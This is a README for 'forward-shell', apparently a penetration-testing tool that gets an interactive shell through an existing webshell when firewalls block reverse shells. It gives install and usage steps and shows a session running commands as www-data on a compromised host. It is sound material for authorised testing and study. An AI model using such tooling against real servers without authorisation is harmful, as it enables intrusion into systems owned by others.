# forward-shell

Sometimes, when exploiting a vulnerability that allows you to execute system commands, it is not possible to get a shell with the traditional methods, due the firewall rules are blocking the incoming and outgoing traffic. In those situations is where the use of [forward shell](https://www.youtube.com/watch?v=-ST2FSbqEcU) is necessary. This script was written taking the [0xdf](https://www.youtube.com/watch?v=ny9MWj6XML4) explanations as reference.


## Installation

```
git clone https://github.com/ret2x-tools/forward-shell.git
```


## Usage

```
root@parrot:~$ python3 forward-shell.py http://www.site.com/webshell.php
(Cmd) whoami
www-data
(Cmd) upgrade
www-data@8f4bca8ef241:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@8f4bca8ef241:/var/www/html$ exit
exit
(Cmd) exit
```


## References

[https://www.youtube.com/watch?v=-ST2FSbqEcU](https://www.youtube.com/watch?v=-ST2FSbqEcU)

[https://www.youtube.com/watch?v=ny9MWj6XML4](https://www.youtube.com/watch?v=ny9MWj6XML4)
